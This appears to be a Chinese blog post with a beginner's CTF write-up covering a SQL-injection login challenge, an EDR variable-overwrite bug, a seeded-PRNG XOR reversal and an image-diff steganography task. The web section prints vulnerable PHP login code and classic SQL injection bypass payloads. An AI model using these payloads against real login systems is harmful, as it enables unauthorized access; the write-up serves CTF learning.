发表于 2020-10-15 分类于 CTF

学习CTF的第二周，事情多的不行，也有一点点烦，题目也难，导致做出的题目少的可怜orz

Web

just_login

这题本打算爆破，但得到友情相助搜得万能密码
主要源码：

$sql = "select username from user where username='". $username ."' and
password='". $password ."';";
$res = mysql_query($sql);
if (@mysql_num_rows($res)<=0) {
die("数据库里没你这号人,别想骗劳资.jpg");
}
echo 'Login Success!Here is your flag:',$flag;

只需要使用“万能密码”使mysql判断为真，返回 mysql_num_rows($res)>0 ，即可得到flag
payload：

1' or 1#
1'||1#
1'||1--+

edr

说着善用搜索引擎，搜出了一直感觉和ctf不相关
直到最后才发现要搜的是一个深信服的0day，是一个简单的变量覆写
所以按着他人博客复现，稍微凑巧获得flag

Reverse

random?

题目的问号给足了提示
看似随机，实则有随机种子，
是伪随机，是一个线性同余发生器，srand()给定，所以每次rand()的数是一模一样的，直接xor就行了

Misc

differentpic

stegsolve直接Image Combiner
得到一张二维码（我直接随缘扫了出来，虽然刚开始想过用黑白色块重新涂一遍）
但官方wp给出python脚本PIL包比较两张照片像素的不同可以得到清晰的二维码

from PIL import Image
import numpy as np
import matplotlib.pyplot as plt
lena = np.array(Image.open('lena.png'))
lena_h, lena_w, _ = lena.shape
flag = np.array(Image.open('flag.png'))
for i in range(lena_h):
for j in range(lena_w):
if lena[i][j][0]!=flag[i][j][0] or lena[i][j][1]!=flag[i][j][1] or
lena[i][j][2]!=flag[i][j][2]:
for k in range(3):
lena[i][j][k] = 255
else:
for k in range(3):
lena[i][j][k] = 0
img1 = Image.fromarray(lena)
img1.save("QRflag.png")
